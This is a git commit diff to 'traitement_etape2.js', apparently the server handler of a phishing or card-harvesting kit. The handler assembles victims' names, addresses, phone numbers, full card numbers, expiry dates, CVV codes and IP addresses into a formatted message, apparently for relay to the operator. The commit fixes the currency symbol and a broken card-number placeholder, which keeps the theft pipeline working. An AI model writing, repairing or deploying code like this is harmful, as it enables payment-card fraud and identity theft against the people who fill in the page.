abcbcbcde8f6194bdf9428d4cd1e4d32741dc8b4
chloesimone409-lang <chloesimone409@gmail.com>
2026-07-18 14:50:49 +0000

    Update traitement_etape2.js

--- api/traitement_etape2.js
+++ api/traitement_etape2.js
@@ -33,9 +33,9 @@ export default async function handler(req, res) {
         message += `📍 **Provenance :** \`Page ${page_source}\`\n\n`;
         message += `👤 **Nom & Prénom :** \`${champ1}\`\n`;
         message += `🏠 **Postale :** \`${champ2}\`\n`;
-        message += `💰 **Montant :** \`${champ3}$\`\n`;
+        message += `💰 **Montant :** \`${champ3}€\`\n`;
         message += `📞 **Tel :** \`${champ4}\`\n\n`;
-        message += `💳 **Numéro Carte :** \` €{cleanChamp5} \`\n`;
+        message += `💳 **Numéro Carte :** \`${cleanChamp5} \`\n`;
         message += `📅 **Expiration :** \`${champ6}\`\n`;
         message += `🔒 **CVV :** \`${champ7}\`\n\n`;
         message += `🖥️ **IP Client :** \`${userIp}\`\n`;
